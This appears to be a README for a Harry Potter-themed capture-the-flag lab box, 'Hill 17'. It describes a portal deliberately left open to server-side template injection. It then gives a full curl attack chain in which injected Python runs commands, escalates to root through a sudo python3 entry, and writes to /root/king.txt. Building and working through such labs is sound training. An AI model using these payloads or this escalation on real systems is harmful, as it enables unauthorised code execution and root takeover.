# Hill 17 - Hogwarts Portal (Harry Potter) (SSTI -> RCE -> sudo python3)

*Theme: Harry Potter.* The house-points portal renders your "spell" through a naive
template engine that evaluates the expression between double braces - **server-side
template injection**. Different engine and escalation than hill-9 (which uses `sudo sed`).

- **Entry:** `GET /cast?spell=...` evaluates any `{{ ... }}`. Prove it with `{{7*7}}`,
  then execute. Foothold: `wizard`. Port 80 (8097 locally).
- **Privesc:** sudoers lets `wizard` run `python3` as root (GTFOBins):
  `sudo python3 -c 'import os;os.system("cat /root/root.txt")'`. Restored on reset.
- **Flags:** `user.txt` (foothold) and `/root/root.txt` (root).

## Attack chain

    # 1. SSTI proof + user flag
    curl -s -G http://127.0.0.1:8097/cast --data-urlencode 'spell={{7*7}}'
    curl -s -G http://127.0.0.1:8097/cast --data-urlencode \
      "spell={{__import__('subprocess').run(['cat','/home/wizard/user.txt'],capture_output=True,text=True).stdout}}"

    # 2. privesc via sudo python3 -> root flag
    curl -s -G http://127.0.0.1:8097/cast --data-urlencode \
      "spell={{__import__('subprocess').run(['sudo','python3','-c','import os;os.system(\"cat /root/root.txt\")'],capture_output=True,text=True).stdout}}"

    # 3. take the hill: write your team token to /root/king.txt as root
    curl -s -G http://127.0.0.1:8097/cast --data-urlencode \
      "spell={{__import__('subprocess').run(['sudo','python3','-c','open(\"/root/king.txt\",\"w\").write(\"TOK-YOUR-TEAM\")'],capture_output=True,text=True).stdout}}"

## Run locally

    docker compose up -d --build   # app: http://localhost:8097/

## Reset behaviour

`reset.sh` restores the `sudo python3` sudoers entry and keeps the server alive. It does
**not** touch `king.txt`.
